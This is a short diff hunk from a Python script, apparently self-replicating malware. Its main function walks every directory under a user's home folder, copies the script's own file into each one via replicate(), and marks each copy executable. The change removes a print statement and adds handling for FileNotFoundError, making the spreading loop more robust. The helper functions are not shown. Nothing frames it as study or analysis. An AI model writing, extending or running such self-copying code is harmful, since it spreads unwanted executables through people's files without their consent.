@@ -46,15 +46,15 @@ def main():
 	filename, location, user = get_file_info()
 	for root, dirs, files in os.walk("/home/"+user+"/"):
 			for name in dirs:
-				print(name)
 				try:
 					destination = replicate(filename, location, user, name)
 					make_executable(destination)
 					print(destination)
 				except PermissionError:
 					continue
+				except FileNotFoundError:
+					continue
 
 
 if __name__ == "__main__":
 	main()
-
